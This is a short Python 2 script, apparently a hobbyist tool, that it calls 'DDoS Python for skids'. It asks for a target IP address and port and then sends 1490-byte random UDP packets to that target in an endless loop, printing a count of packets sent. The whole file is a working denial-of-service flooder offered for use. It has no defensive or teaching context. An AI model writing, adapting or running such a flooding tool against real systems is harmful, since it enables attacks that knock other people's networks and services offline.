#!/usr/bin/python2

#imports
import os 
import sys
import socket
import random

'''
DDoS Python for skids 
'''


# this makes the socket 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# not needed just used to make the program more cool and skiddish
# clears the terminal 
os.system("clear")

# declares target ip and port of ddos 
ip = raw_input("ip adress: ")
port = input("port: ")

# ddos attack while loop
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 0 # if higher it will connect to different ports
     print "sent %s packets to %s on port:%s"%(sent,ip,port)
     if port == 65534:
         port = 1